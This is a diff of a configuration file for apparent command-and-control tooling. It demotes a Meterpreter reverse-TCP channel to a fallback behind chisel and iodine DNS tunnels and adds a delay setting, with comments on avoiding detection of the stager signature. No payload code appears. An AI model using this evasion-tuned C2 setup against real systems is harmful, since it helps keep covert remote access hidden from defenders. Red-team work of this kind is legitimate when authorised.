@@ -81,9 +81,16 @@ dns_tunnel:
   # Lazy mode (fewer queries when idle, saves bandwidth)
   lazy_mode: true
 
-# ── Python Meterpreter — Secondary C2 ─────────────────────────
+# ── Python Meterpreter — Fallback C2 ─────────────────────────
+# Meterpreter reverse TCP has a recognisable stager signature.
+# To reduce detection risk, it only attempts after chisel AND
+# iodine have both failed for fallback_delay seconds.  A port
+# reachability check runs before each attempt to avoid sending
+# the stager handshake to a closed port.
 meterpreter:
   enabled: true
+  # Seconds to wait after primaries fail before attempting (default 120)
+  fallback_delay: 120
   # Connection timeout per attempt (seconds)
   connect_timeout: 10
   # Retry delay between port attempts (seconds)
